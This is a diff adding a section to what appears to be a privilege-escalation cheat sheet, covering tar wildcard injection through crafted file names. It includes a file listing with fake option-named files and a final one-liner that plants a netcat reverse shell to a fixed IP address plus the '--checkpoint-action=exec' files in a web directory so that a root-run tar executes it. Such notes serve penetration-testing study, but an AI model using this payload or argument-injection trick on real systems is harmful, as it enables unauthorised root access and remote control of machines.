@@ -410,3 +410,38 @@ int main(){
 gcc nfs.c -o nfs -w
 chmod +s nfs
 ```
+-----------------------------------------------------
+
+The issue can be manifested by using specific options in chown, tar, rsync etc. By using specially crafted filenames, an attacker can inject arbitrary arguments to shell commands run by other users – root as well.
+
+**Privilege escalation tar**
+
+Running 
+```bash
+tar cf archive.tar *
+``` 
+on a folder with these files seems pretty straightforward and benign.
+The problem arises if the user created a couple of fake files and a shell script that contains any arbitrary command.
+
+```bash
+-rw-r–r–. 1 leon leon 0 Oct 28 19:19 –checkpoint=1
+
+-rw-r–r–. 1 leon leon 0 Oct 28 19:17 –checkpoint-action=exec=sh shell.sh
+
+-rw-rw-r–. 1 user user 187 Oct 28 17:44 db.php
+
+-rw-rw-r–. 1 user user 201 Oct 28 17:43 download.php
+
+-rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh
+```
+
+By using the * wildcard in the tar command, these files will be understood as passed options to the tar binary and shell.sh will be executed as root.
+
+Basically, tar allows the usage of 2 options that can be used for poisoning, in order to force the binary to execute unintended actions:
+
+1.	checkpoint[=NUMBER] — this option displays progress messages every NUMBERth record (default value is 10)
+2.	checkpoint-action=ACTION — this option executes said ACTION on each checkpoint
+
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.39.185 4455 >/tmp/f" > shell.sh && touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" && touch "/var/www/html/--checkpoint=1"
+```
